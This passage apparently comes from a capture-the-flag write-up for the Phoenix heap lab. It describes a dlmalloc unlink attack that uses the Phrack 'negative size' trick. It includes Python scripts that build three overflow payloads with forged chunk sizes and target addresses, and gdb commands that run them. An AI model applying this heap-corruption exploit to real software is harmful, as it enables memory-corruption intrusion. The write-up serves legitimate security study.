Continuing.
Level was successfully completed at @ 1765986682 seconds past the Epoch


Program received signal SIGSEGV, Segmentation fault.
0xf7e69017 in ?? ()
```


But this unfortunately wont work, as the program is using strcpy() the strcpy will end the stream input at null bytes,


We need something that would surely work, a workaround was given in vudo malloc() of phrack series.

negative sizes! 0xFFFFFFFC would negate and output -4

Negative sizes (this is extremely clean and clever):


> For instance, if the attacker overwrites the size field of the second
chunk with -4 (0xfffffffc), dlmalloc will think the beginning of the
next contiguous chunk is in fact 4 bytes before the beginning of the
second chunk, and will therefore read the prev_size field of the second
chunk instead of the size field of the next contiguous chunk. So if
the attacker stores an even integer (an integer whose PREV_INUSE bit
is clear) in this prev_size field, dlmalloc will process the corrupted
second chunk with unlink() and the attacker will be able to apply the
technique described in 3.6.1.1.
– https://phrack.org/issues/57/8


```py
python3 - << 'EOF' > /tmp/arg1
import sys
sys.stdout.buffer.write(
    b"A"*8 +
    b"\xb8\xd5\x87\x04\x08\xff\xd0\xc3" +
    b"\xff\xd0"
)
EOF


python3 - << 'EOF' > /tmp/arg2
import sys
sys.stdout.buffer.write(
    b"B"*36 +
    b"\x65"
)
EOF


python3 - << 'EOF' > /tmp/arg3
import sys
sys.stdout.buffer.write(
    b"C"*92 +
    b"\xfc\xff\xff\xff" +
    b"\xfc\xff\xff\xff" +
    b"\x30\xc1\x04\x08" +
    b"\x10\x90\xe6\xf7"
)
EOF
```

```c
set args $(cat /tmp/arg1) $(cat /tmp/arg2) $(cat /tmp/arg3)
run
```

Ran this inside gdb with 100 * C but it didnt worked then i shorten it to 92 which then worked fine..?

![done](/assets/phoenix-heap/heaoo.png)

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>